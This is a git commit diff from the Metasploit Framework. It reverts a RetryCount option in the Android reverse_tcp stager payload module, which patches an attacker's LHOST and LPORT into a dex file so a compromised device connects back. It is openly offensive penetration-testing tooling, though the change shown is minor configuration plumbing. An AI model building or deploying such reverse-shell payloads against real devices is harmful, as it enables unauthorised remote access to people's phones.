b14f3cab46201f4be62da9d45e84d26fd03a22e9
AnwarMohamed <anwarelmakrahy@gmail.com>
2014-02-26 04:32:18 +0200

    Revert "android reverse_http/s"
    This reverts commit 65ada24d9e9caf2a3a39a4bd2d4d6390cded19c5.

--- modules/payloads/stagers/android/reverse_tcp.rb
+++ modules/payloads/stagers/android/reverse_tcp.rb
@@ -24,11 +24,6 @@ module Metasploit3
       'Handler'		=> Msf::Handler::ReverseTcp,
       'Stager'		=> {'Payload' => ""}
     ))
-
-    register_options(
-    [
-      OptInt.new('RetryCount', [true, "Number of trials to be made if connection failed", 10])
-    ], self.class)
   end
 
   def string_sub(data, placeholder, input)
@@ -42,7 +37,6 @@ module Metasploit3
 
     string_sub(classes, '127.0.0.1                       ', datastore['LHOST'].to_s) if datastore['LHOST']
     string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
-    string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
     jar.add_file("classes.dex", fix_dex_header(classes))
 
     files = [
